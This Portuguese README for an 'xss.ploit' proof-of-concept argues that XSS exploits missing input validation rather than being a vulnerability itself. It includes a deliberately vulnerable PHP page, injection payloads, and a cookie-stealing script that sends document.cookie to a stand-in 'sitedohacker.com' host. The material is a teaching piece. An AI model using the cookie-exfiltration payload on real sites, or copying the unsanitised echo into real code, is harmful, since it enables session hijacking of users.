# xss.ploit

AVISO: Esta Ferramenta / Exploit / Código foi criada apenas como fins educacionais, não tenho objetivo de contribuir com ações ilícitas, muito menos influenciar.

Bom, vamos lá, este código foi criado por mim mesmo (ismael oliveira), irei resumir a história:

Recentemente eu comecei a compartilhar uma idéia dizendo que XSS NÃO É VULNERABILIDADE, óbviamente isto gerou o que falar aqui e ali, este código / exploit que criei é uma POC - PROVA DE CONCEITO do que eu estou falando, quero mostrar para as pessoas este ponto de visão com este código.

Primeiro Ponto importante: Quando falamos de XSS ACADEMICAMENTE, É CORRETO DIZER QUE XSS É "VULNERABILIDADE", EU CONCORDO COM ISTO, eu quero deixar isso bem CLARO, por favor se você vai fazer uma entrevista de EMPREGO ou mesmo tirar uma CERTIFICAÇÃO DE SEGURANÇA DA INFORMAÇÃO, afirme dizer que no meio ACADÊMICO É CONSIDERADO XSS VULNERABILIDADE!!!

O que eu quero te apresentar é o OUTRO LADO DA MOEDA, FORA DO MEIO ACADÊMICO, então MUITA ATENÇÃO, não vá na sua reunião de trabalho falando que XSS NÃO É VULNERABILIDADE, quer dizer, você até pode, mas o meio ACADÊMICO NÃO ACEITA ISTO.

Dado este aviso, agora vamos ver o outro lado da moeda que eu mencionei existir.

Para começar vamos pegar a DEFINIÇÃO DE VULNERABILIDADE, AMEAÇA E RISCO em SEGURANÇA DA INFORMAÇÃO, vou puxar de uma fonte de Referência para você:

"Vulnerabilidade (Vulnerability ) - Fraquezas ou buraco em um programa de segurança que podem ser exploradas por ameaças para obter acesso não autorizado a um ativo."

"Ameaça (Threat) - Qualquer coisa que possa explorar uma vulnerabilidade, intencional ou acidentalmente, e obter, danificar ou destruir um ativo."

"Risco (Risk) - O potencial de perda, dano ou destruição de um ativo como resultado de uma ameaça que explora uma vulnerabilidade.
Risco é uma possibilidade de corromper um ativo, através de ameaças e vulnerabilidades."

Fonte de onde eu tirei: https://www.itfacil.com.br/ameaca-vulnerabilidade-risco-sopa-de-letrinhas

Vejamos o significado agora de EXPLOIT:

"A definição geral de exploits é que eles são programas ou códigos projetados para abusar de vulnerabilidades de software ou hardware e causar efeitos indesejados pelos desenvolvedores ou fabricantes. Para melhor entendimento, pense nas falhas de programas como uma fruta no alto de uma árvore, e no exploit como a escada que você usa para alcançar o alimento."

Fonte de onde eu tirei: https://canaltech.com.br/seguranca/o-que-e-exploit-203850/

"Um exploit é um ataque que se aproveita de vulnerabilidades em aplicativos, redes, sistemas operacionais ou hardwares."

Fonte de onde eu tirei: https://www.avast.com/pt-br/c-exploits

CONCLUSÃO:

Definimos quando alguma coisa está "vulnerável" quando é uma "fraqueza", algo suscetível a ataques, pode vir algo ou alguém e tirar proveito daquilo, pode vir algo e EXPLORAR aquilo.

Definimos Exploit algo que TIRA PROVEITO de uma "vulnerabilidade", ele tira proveito de uma BRECHA DE SEGURANÇA ABERTA.

Vamos para o seguinte EXEMPLO:

Vamos imaginar que você mora em um bairro perigoso, uma criminalidade alta (exemplo), aí em determinado dia você precisa URGENTEMENTE sair as 3 horas da manhã, você SOZINHO(A) andando a Pé pelas ruas de Madrugada.

Observe: Você andando Sozinho(a) nas ruas de madrugada em um bairro considerado Perigoso, você está em qual situação? 

Você está numa Situação de PERIGO, pode vir uma OUTRA PESSOA e Assaltar você por exemplo.

Ou seja: Você estava VULNERÁVEL.

Com isto eu quero te mostrar que "vulnerabilidade" não é apenas em computadores, também existem outros contextos que dizemos que aquilo está "vulnerável"

Veja:

"Vulnerabilidade refere-se à 'qualidade ou estado de exposição à possibilidade de ser atacado ou prejudicado, física ou emocionalmente'."

Fonte: https://en.wikipedia.org/wiki/Vulnerability


E olha só, neste exato ponto do texto eu estava aqui procurando uma referência para lhe entregar sobre o que é "vulnerabilidade" e encontrei uma coisa interessante na PRÓPRIA OWASP:

"Uma vulnerabilidade é um buraco ou uma fraqueza no aplicativo, que pode ser uma falha de projeto ou um bug de implementação, que permite que um invasor cause danos às partes interessadas de um aplicativo. "

O que tem de interessante na referência da OWASP é isto aqui:

Exemplos de vulnerabilidades

    [bem aqui] Falta de validação de entrada na entrada do usuário [bem aqui]
    Falta de mecanismo de registro suficiente
    Tratamento de erro de falha aberta
    Não fechando a conexão com o banco de dados corretamente


Link para a Referhttps://owasp.org/www-community/vulnerabilities/

E é EXATAMENTE AQUI QUE A POLÊMICA COMEÇA!!

Quando eu comecei a divulgar sobre o XSS NÃO SER VULNERABILIDADE foi exatamente com um exemplo de um SITE VULNERÁVEL, eu não vou ficar de papo furado e vou logo te dar um exemplo com códigos.

crie um arquivo com o nome vulneravel.php e coloque este código dentro dele:

<form action="<?php echo $_SERVER['PHP_SELF']?>">
Digite seu nome:
<input type="text" name="nome">
<input type="submit">
</form>

<?php
echo "Olá ".$_GET['nome']." seja bem vindo(a) ao nosso site!!";
?>

claro, habilite o seu localhost e acesse:

http://localhost/vulneravel.php?nome=maria

Veja que irá refletir de volta no navegador uma mensagem com o nome da Maria, agora troque o nome da Maria nesta URL para isto aqui:

http://localhost/vulneravel.php?nome=<script>alert(1)</script>

Observe que irá refletir o tão FAMOSO POP-UP NÚMERO 1 em seu navegador.

Agora, para, pensa e analisa:

POR QUE BATATAS FUNCIONOU ESTE <script>alert(1)</script> ???????????????????

Pare e observe:

O MOTIVO DE FUNCIONAR, está bem aqui:

echo "Olá ".$_GET['nome']." seja bem vindo(a) ao nosso site!!";

O PHP simplesmente PEGA QUALQUER COISA que você escrever neste parâmetro GET e REFLETE novamente para você em seu navegador, veja, ELE JOGA PARA O NAVEGADOR, ou seja:

QUEM EXECUTOU O JAVASCRIPT FOI O SEU NAVEGADOR!!!

O PHP simplesmente pegou o que você escreveu e jogou na tela do navegador.

Ok, respondemos um PEDAÇO DA PERGUNTA, mas tem mais uma coisa aqui, ainda novamente vamos perguntar, PORQUE BATATAS FRITAS ISSO FUNCIONOU?????????

Se parar para analisar com calma novamente:

echo "Olá ".$_GET['nome']." seja bem vindo(a) ao nosso site!!";

veja:

$_GET['nome']

O código PHP está pegando DIRETAMENTE QUALQUER COISA PASSADA NO PARÂMETRO GET SEM NENHUM TIPO DE FILTRO PARA VERIFICAR O QUE O USUÁRIO ESTÁ ENVIANDO!!!

Opa, então pare e pense:

Quando você injetou tag <script>alert(1)</script> aconteceu o seguinte:

1° - você enviou para o arquivo PHP
2° - O código PHP pegou o que você escreveu depois daquele sinal de igual na url http://localhost/vulneravel.php?nome=<script>alert(1)</script> e jogou na tela.
3° - Chegou para o seu navegador a RESPOSTA HTTP do arquivo PHP e nessa resposta tem um código Javascript, a responsabilidade do Navegador é JUSTAMENTE EXECUTAR HTML, CSS E JAVASCRIPT, então ele viu esse código javascript e executou.

Percebeu? Você também pode injetar HTML e CSS que também vai funcionar, daí vem HTML/CSS INJECTION, ou seja, MESMA COISA.

HTML Injection:

http://localhost/vulneravel.php?nome= &#60;h1&#62;oi eu sou uma POC de html injection&#60;/h1&#62;

CSS Injection:

http://localhost/vulneravel.php?nome=<style>body{background-color: blue;}</style>

Aí vem nosso amigo XSS:

http://localhost/vulneravel.php?nome= &#60;script>alert(1)</script&#62;

AGORA, PARE E PENSE:

Se tem HTML/CSS Injection, POR QUE NÃO JAVASCRIPT INJECTION e tem esse nome "XSS" ou "Cross-site Scripting", veja, por esta lógica TAMBÉM DEVERIA SER JAVASCRIPT INJECTION, POR QUE NÃO?

Aff, quero um copo de café, já digitei muito, peraí, já volto pra escrever mais um pouco...


uma hora depois...


Ufa, volteo, agora sim, vamos lá...



Bom, sobre o POR QUE TEM ESSE NOME?

Fica tranquilo(a) aí, relaxa que vou te explicar isso daqui a pouco nesse mesmo texto, por enquanto só vai pensando aí, porque agora eu vou querer voltar naquela PERGUNTA NOVAMENTE, POR QUE BATATAS FUNCIONOU O <script>alert(1)</script>?????????????

Voltamos...

echo "Olá ".$_GET['nome']." seja bem vindo(a) ao nosso site!!";

Se tu parar para analisar bem com calma, verá que o PROBLEMA DE SEGURANÇA AQUI NESTE CÓDIGO ACIMA É NÃO LIMPAR A ENTRADA DO USUÁRIO, veja que o problema está em pegar DIRETAMENTE O QUE O USUÁRIO ESCREVEU NO PARÂMETRO GET ($_GET['nome']/nome=aqui)

Veja, o que pode acontecer agora se o programador colocar:

<?php
echo "Olá ".filter_input(INPUT_GET, 'nome', FILTER_SANITIZE_SPECIAL_CHARS)." seja bem vindo ao nosso site!!";
?>

Agora tente novamente:


HTML Injection:

http://localhost/vulneravel.php?nome= &#60;h1&#62;oi eu sou uma POC de html injection&#60;/h1&#62;

CSS Injection:

http://localhost/vulneravel.php?nome= &#60;style&#62;body{background-color: blue;}&#60;/style&#62;

XSS:

http://localhost/vulneravel.php?nome= &#60;script&#62;alert(1)&#60;/script&#62;


Tenta aí...


Percebeu que agora parou de funcionar o HTML/CSS INJECTION E XSS?

Então agora pare e pense:

ONDE ESTAVA O PROBLEMA DE SEGURANÇA?

ESTAVA NO HTML &#60;h1&#62;oi eu sou uma POC de html injection&#60;/h1&#62; QUE INJETAMOS?
ESTAVA NO CSS <style>body{background-color: blue;}</style> QUE INJETAMOS?
ESTAVA NO JAVASCRIPT <script>alert(1)</script> QUE INJETAMOS?

Ou:

ESTAVA EM NÃO BLOQUEAR OS CARACTERES PERIGOSOS COMO <> ???????????????????


Pensa comigo:

Para uma VULNERABILIDADE, temos que ter o que? Temos que ter uma CORREÇÃO, certo?


Agora pensa:

A vulnerabilidade que realmente existe neste código acima é Não Limpar o que o usuário escreveu, porque é daí que vem A POSSIBILIDADE DE INJETAR CÓDIGOS HTML/CSS E XSS.

Pense:

Se o XSS for uma vulnerabilidade, neste código acima SERIA INÚTIL fazer o tratamento do que o usuário escreveu.

Como corrigir este código acima sem tratar o que o usuário escreveu? Consegue me dizer?

Porque é justamente isso aí que eu estou tentando dizer. E agora eu fiquei feliz porque consegui encontrar uma boa referência para te dar de argumento, a PRÓPRIA OWASP e também a CWE-20, veja novamente a OWASP e também a CWE-20:


OWASP:

"Uma vulnerabilidade é um buraco ou uma fraqueza no aplicativo, que pode ser uma falha de projeto ou um bug de implementação, que permite que um invasor cause danos às partes interessadas de um aplicativo."

Exemplos de vulnerabilidades

    [BEM AQUI] Falta de validação de entrada na entrada do usuário [BEM AQUI]
    Falta de mecanismo de registro suficiente
    Tratamento de erro de falha aberta
    Não fechando a conexão com o banco de dados corretamente

Link: https://owasp.org/www-community/vulnerabilities/


CWE-20:

"O produto recebe entrada ou dados, mas não valida ou valida incorretamente que a entrada possui as propriedades necessárias para processar os dados com segurança e corretamente."

https://cwe.mitre.org/data/definitions/20.html


Agora vem uma NOVA PERGUNTA, nesta situação então, o XSS É O QUE? XSS É UMA COXINHA?


Ou podemos dizer agora que XSS NESTE CASO ESPECÍFICO é um EXPLOIT SE APROVEITANDO da vulnerabilidade INPUT IMPROPER VALIDATION, UMA FALTA DE LIMPEZA DA ENTRADA DO USUÁRIO?


Percebeu?

Você só conseguia executar javascript NESTE CASO porque não tinha nenhum tratamento em cima do que você escrevia.

Ou seja: Aproveitamos da situação onde não existe um tratamento do que escrevemos para injetar tags HTML/CSS e JAVASCRIPT.


Então... Vem a pergunta de UM MILHÃO DE DÓLARES:


XSS É VULNERABILIDADE???

Então...


Agora voltamos na outra pergunta, POR QUE TEM ESSE NOME CROSS-SITE SCRIPTING??????????

Olha, se tu pesquisar um pouquinho, vai descobrir que além de XSS, existem outros como:

XFS - CROSS FRAME SCRIPTING
XSRF/CSRF - CROSS-SITE SCRIPTING
XST - CROSS-SITE TRACING
XSS - CROSS-SITE SCRIPTING

Veja, todos são "Cross alguma coisa", de onde vem isso?

Vem daqui:

XS-LEAKS

https://xsleaks.dev/

Detalhe: Aí de forma ACADÊMICA vai dizer "vulnerabilidade", segue aquilo que eu tinha falado, no meio acadêmico vamos chamar de vulnerabilidade, mas aqui em nosso caso vamos pensar um pouco fora da caixa acadêmica...


Vejamos um exemplo:

XSRF/CSRF - CROSS-SITE REQUEST FORGERY

(Falsificação de requisição entre sites)

Veja: CROSS-SITE (Entre Sites)

É alguma coisa que vai estar no meio de um site e outro, neste caso, uma falsa requisição HTTP em nome do usuário.

Com XSRF/CSRF você consegue por exemplo forçar o navegador do usuário a mandar uma requisição HTTP para um site a partir de outro site.

Você pode ver a explicação da própria Portswigger e ainda fazer os laboratórios gratuitos deles:

https://portswigger.net/web-security/csrf

agora, pense:


CROSS-SITE SCRIPTING

(SCRIPT ENTRE SITES)


Se parar para analisar, isso significa que é a idéia de um ÚNICO SCRIPT que consegue interagir ENTRE SITES DIFERENTES, de um site para outro site.


Percebeu?

Isso signifca então que:

Quando o Atacante consegue injetar tags <script> em um site que não limpa a entrada, ele pode aproveitar dessa situação, explorando e fazendo um ataque a usuários com um único código de script rodando dentro do site vulnerável e interagindo ao mesmo tempo com o SITE DO HACKER, ou seja: CROSS-SITE SCRIPTING.

Percebeu?

Se você estudar sobre o XSRF/CSRF, XFS, XST, irá perceber que também carregam esta idéia de entre uma coisa e outra ao mesmo tempo.

Vejamos um exemplo, este aqui é até popular, famoso COOKIE STEALING / COOKIE HIJACKING:

<script>
var imag = new Image;
imag.src="https://sitedohacker.com/?cookie="+document.cookie;
</script>

Veja, ao injetar isso na url do site vulnerável:

https://sitevulneravel.com/?parametro=<script>var imag = new Image/ imag.src="https://sitedohacker.com/?cookie="+document.cookie;</script>

Observe com atenção:

Este script será CARREGADO E EXECUTADO dentro do SITE VULNERÁVEL, daí ele vai capturar os cookies DE DENTRO DO SITE VULNERÁVEL e mandar para um SITE TERCEIRO, neste caso o SITE DO HACKER, ou seja: CROSS-SITE SCRIPTING.

Peraí, então se essa é a idéia de CROSS-SITE SCRIPTING, então significa que <script>alert(1)</script> NÃO É XSS?

Exatamente!

Porque se parar para analisar o script <script>alert(1)</script> está interagindo apenas com UM ÚNICO SITE, neste caso o próprio SITE VULNERÁVEL.

Então isso podemos dizer que é SCRIPT INJECTION, porque ele só está interagindo com um site, não está carregando a idéia de "cross-site".

Mas, novamente, idéia acadêmica, se tem um script injection, normalmente vamos considerar "xss", até porque se você consegue injetar um script, o XSS se torna automaticamente possível, então podemos considerar este lado da moeda.


Mas agora, PARE E PENSE:


XSS É SOMENTE NA ENTRADA DO USUÁRIO EM LUGAR DE ESCREVER (caixinha de texto)????????



Resposta:


NÃO, não é.

Inclusive, aqui mesmo neste github eu vou deixar um exemplo de um site vulnerável que é por meio de UPLOAD DE ARQUIVOS.

Observe, já é um pouquinho diferente, dessa vez você vai infectar um arquivo e colocar javascript dentro dele para mandar para o site, você pode por exemplo executar Javascript em arquivos:

arquivo.html
arquivo.shtml
arquivo.shtm
arquivo.php

Sim, PHP, se tu colocar JS nele o código será executado no navegador.

Inclusive, eu encontrei uma coisa interessante, por curiosidade, olha isso:

"Dem**nios de malvertising usando explorações poliglotas em ataques do mundo real "

"Os cibercriminosos começaram a usar as chamadas 'imagens poliglotas' para disfarçar ataques de malvertising .

As explorações poliglotas concentram-se em arquivos de carga útil maliciosos que podem ser interpretados como uma imagem ou um pedaço de JavaScript.

A tática – identificada por pesquisadores da empresa de prevenção de fraudes publicitárias Devcon – foi adotada por um grupo que espera passar JavaScript malicioso como arte.

A abordagem é aparentemente motivada por uma tentativa de impedir a verificação de arquivos JavaScript em busca de conteúdo malicioso por redes de anúncios.

Os chapéus pretos manipularam cabeçalhos de arquivo para que um arquivo de carga útil possa ser interpretado como uma imagem BMP ou JavaScript, disseram os pesquisadores da Devcon. 

"

Link:

https://portswigger.net/daily-swig/malvertising-fiends-using-polyglot-exploits-in-real-world-attacks



Interessante não é?


Agora, tem mais, olha isso aqui:

UNIVERSAL XSS

"O UXSS preserva as características básicas do XSS: explorar uma vulnerabilidade, executar código malicioso, porém há uma grande diferença:

Ao contrário dos ataques XSS comuns, o UXSS é um tipo de ataque que explora vulnerabilidades do lado do cliente no navegador ou nas extensões do navegador para gerar uma condição XSS e executar código malicioso. Quando essas vulnerabilidades são encontradas e exploradas, o comportamento do navegador é afetado e seus recursos de segurança podem ser ignorados ou desativados. 

Impacto

O efeito líquido disso é o fato de que o invasor não apenas obtém acesso a uma sessão comprometida em uma página da Web vulnerável, mas também pode obter acesso a qualquer sessão pertencente a páginas da Web atualmente abertas (ou armazenadas em cache) pelo navegador no momento o ataque é acionado.

Simplificando, o UXSS não precisa de uma página da web vulnerável para ser acionado e pode penetrar em sessões da web pertencentes a páginas da web seguras e bem escritas, criando assim uma vulnerabilidade onde não há uma. "


Link: https://www.acunetix.com/blog/articles/universal-cross-site-scripting-uxss/


Percebeu? XSS DIRETO NO NAVEGADOR...



SELF XSS


"Self-XSS ( self cross-site scripting ) é um ataque de engenharia social usado para obter o controle das contas da web das vítimas. Em um ataque Self-XSS, a vítima do ataque, sem saber, executa um código malicioso em seu próprio navegador da Web, expondo informações pessoais ao invasor, um tipo de vulnerabilidade conhecido como cross-site scripting.


O Self-XSS opera enganando os usuários também para que copiem e colem conteúdo malicioso no console do desenvolvedor da Web de seus navegadores . [1] Normalmente, o invasor publica uma mensagem dizendo que, ao copiar e executar determinado código, o usuário poderá receber recompensas virtuais ou invadir um site. Na verdade, o código permite que o invasor sequestre a conta da vítima."

Link: https://en.wikipedia.org/wiki/Self-XSS



OU SEJA:

XSS NÃO É SOMENTE EXPLOIT DE ENTRADA DO USUÁRIO!!!

XSS É MUITO MAIS QUE ISSO!!!

Veja, XSS direto no navegador ou enganando a vítima para executar um código no console do navegador.


OUTRA PERGUNTA, É SOMENTE JAVASCRIPT???


Resposta: Não, existem outras linguagens de script para navegador também, veja:


"VBScript ( Microsoft Visual Basic Scripting Edition )  é uma versão interpretada da linguagem Visual Basic usada em Active Server Pages (ASP) para tarefas e construção dinâmica de página HTML , e Windows Scripting Host (WSH) para facilitar a construção de ferramentas por técnicos ou tarefas automatizadas. "

(Hoje em dia ninguém usa esse VBScript, mas como exemplo, tá valendo)

Link: https://pt.wikipedia.org/wiki/VBScript


Outra:

"PyScript é uma estrutura que permite aos usuários criar aplicativos Python avançados no navegador usando a interface do HTML e o poder do Pyodide , WASM e tecnologias modernas da Web. A estrutura PyScript fornece aos usuários em todos os níveis de experiência acesso a uma linguagem de programação expressiva e fácil de aprender com inúmeros aplicativos. "

Link: https://pyscript.net/

Ou seja, Javascript é só um deles...



OK, AGORA VAMOS LÁ, SOBRE A FERRAMENTA / EXPLOIT  DE POC QUE EU CRIEI



Esse código eu criei como uma prova de conceito da idéia de "Cross-Site Scripting", um único código de script que consegue interagir com dois sites ou mais ao mesmo tempo.

Neste código que eu criei eu mostro um exemplo onde o Hacker tem o site dele e também existe o site vulnerável, o JAVASCRIPT é executado dentro do site VULNERÁVEL aberto no NAVEGADOR DA VÍTIMA, então é feito uma requisição HTTP para uma API que irá coletar o endereço IP da Vítima e ao mesmo tempo irá FAZER UMA REQUISIÇÃO HTTP PARA O SITE DO HACKER, ou seja, CROSS-SITE SCRIPTING.

No site do hacker, ele coleta o endereço IP, faz um whois e salva dentro de um arquivo.

Obs: Isto é apenas uma POC - PROVA DE CONCEITO, JÁ EXISTEM FERRAMENTAS MAIS COMPLETAS PARA ISTO, posso citar o exemplo da BEEF XSS, ela consegue também executar um SCRIPT ENTRE SITES e nesse caso mais completo porque de uma certa forma o hacker consegue controlar o navegador da vítima dentro do site vulnerável, dê uma olhada:


https://beefproject.com/


CONCLUSÃO:

Com isto eu quero mostrar que XSS é muito mais do que as pessoas conhecem sobre o famoso POP-UP NÚMERO 1, também quero mostrar a resposta da polêmica em dizer que XSS NÃO É VULNERABILIDADE, PODEMOS CONCLUIR QUE XSS NÃO É EXCLUSIVAMENTE UMA COISA ESPECÍFICA, ELE APARECE EM LUGARES/CONTEXTOS DIFERENTES, e no caso de sites semelhantes ao nosso, XSS de fato não é a vulnerabilidade, ele Explorava uma vulnerabilidade, neste caso uma entrada do usário sem validação.


E aí? O que achou? :)


Eu encontrei uma OUTRA REFERÊNCIA INTERESSANTE QUE TAMBÉM VALIDA O QUE ESTOU FALANDO:

XSS Attack (Como Funciona e Como Prevenir Ataques) -  DICIONÁRIO DO PROGRAMADOR

<iframe width="560" height="315" src="https://www.youtube.com/embed/2LYPyUk-L0k" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>













